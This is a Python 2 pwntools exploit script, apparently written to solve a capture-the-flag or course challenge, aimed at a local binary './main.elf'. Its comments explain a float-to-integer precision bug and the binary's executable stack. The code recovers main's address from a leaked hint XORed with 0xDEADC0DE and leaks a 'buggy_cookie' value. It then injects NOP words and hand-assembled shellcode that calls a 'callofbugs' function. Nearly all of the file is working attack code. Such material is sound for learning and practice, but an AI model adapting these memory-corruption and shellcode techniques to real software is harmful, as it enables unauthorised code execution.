#!/usr/bin/env python2

from pwn import *
from struct import *
import tty

binary = "./main.elf"
velf = ELF(binary) 

p = process(binary)

"""
Floats are 32 bits and unsigned ints are 32 bits. 
In uint we have 32 bits of number, but in float the mantissa is 24 bits and there is 1 bit of sign. 
Uints that need more than 24 bits to be represented can't be converted exactly to float. 
The maximum number you can represent exactly in a float are 0 ... 16777216. 
16777217 isn't representable exactly. 
"""


"""
RELRO:    Full RELRO -> GOT is read only
    Stack:    Canary found
    NX:       NX disabled  -> stack is executable
    PIE:      PIE enabled
    RWX:      Has RWX segments
    FORTIFY:  Enabled
"""

"""
print "16777217 16777218" + "\n" + "1\n"*16 + "0x90900000\n" + "0x90909090\n"*26 + "0x555b9068\n" + "0x0c685b56\n" + "0xff565580\n" +"0x000000d3\n"
input for gdb, just with the address of buggy_cookie, instead of the value, can not leak it in gdb
range which will loop until we stop
16 words for the buffer (in gdb starting from 0xffffccfc)
after the buffer (in gdb from 0xffffcd3c), starts the code of compare_uints, from the stack, so i am writting nops, up until 42d word, when the address is leaked, the first instruction is one with 0000 hex,
because that was always overwritten on the stack with 00
from there i write: 
push addrofcallofbugs
pop rbx
push valueofbuggy_cookie
call rbx
"""



p.sendline("16777217 16777218" + "\n" + "1\n"*16 + "0x90900000\n" + "0x90909090\n"*26)


log.info(p.recvuntil("Hint: "))
hintpom = p.recv(10)
hintAddr = int(hintpom, 0)
p.recvuntil("\n", timeout=0.2)
log.info(hex(hintAddr))


mainAddr = hintAddr ^ 0xDEADC0DE
callofbugs = mainAddr + velf.symbols['callofbugs'] - velf.symbols['main']
log.info("Address of main is: " + hex(mainAddr))
log.info("Address of the callofbugs: " +  hex(callofbugs))


buggy_cookie = mainAddr - velf.symbols['main'] + velf.symbols['buggy_cookie']
log.info("Address of start of code: " +  hex(mainAddr - velf.symbols['main']))
log.info("Offset of the buggy_cookie: " +  hex(velf.symbols['buggy_cookie']))
log.info("Address of the buggy_cookie: " +  hex(buggy_cookie))
buggy_cookieVal = u32(p.leak(buggy_cookie, 4))
log.info("Value of the buggy_cookie: " +  hex(buggy_cookieVal))


firstWord = hex(callofbugs)[4:]+"68" #push callofbugs 68=>push imm
secondWord =hex(buggy_cookieVal)[8:] + "68" + "5b"+ hex(callofbugs)[2:4] #5b => pop ebx + push buggy_cookieVal
thirdWord = "ff" + hex(buggy_cookieVal)[2:8] #ff d3 => call ebx
fourthWord = "000000d3"
p.sendline("0x" + firstWord + "\n" + "0x" +secondWord + "\n" + "0x" + thirdWord + "\n" + "0x"+ fourthWord + "\n") 
p.send(chr(tty.CEOF))

log.info(p.recvuntil("sorting", timeout=0.2))


log.info(p.recvline(timeout=0.2))
log.info(p.recvline(timeout=0.2))
log.info(p.recvline(timeout=0.2))






